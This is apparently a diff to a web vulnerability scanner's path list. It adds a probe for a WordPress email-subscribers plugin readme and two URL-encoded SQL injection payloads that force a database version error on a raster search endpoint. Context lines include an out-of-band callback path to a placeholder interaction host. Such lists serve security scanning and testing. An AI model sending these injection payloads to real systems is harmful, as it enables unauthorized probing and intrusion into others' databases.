@@ -728,3 +728,6 @@
 /_image?href=//{{interactsh-url}}/600x400
 /{{trim_prefix(update_uri,
 /php/ping.php
+/wp-content/plugins/email-subscribers/readme.txt
+/?band=1)%20AND%201=CAST((SELECT%20version())%20AS%20INT)--
+/api/raster/search/?band=1)%20AND%201=CAST((SELECT%20version())%20AS%20INT)--
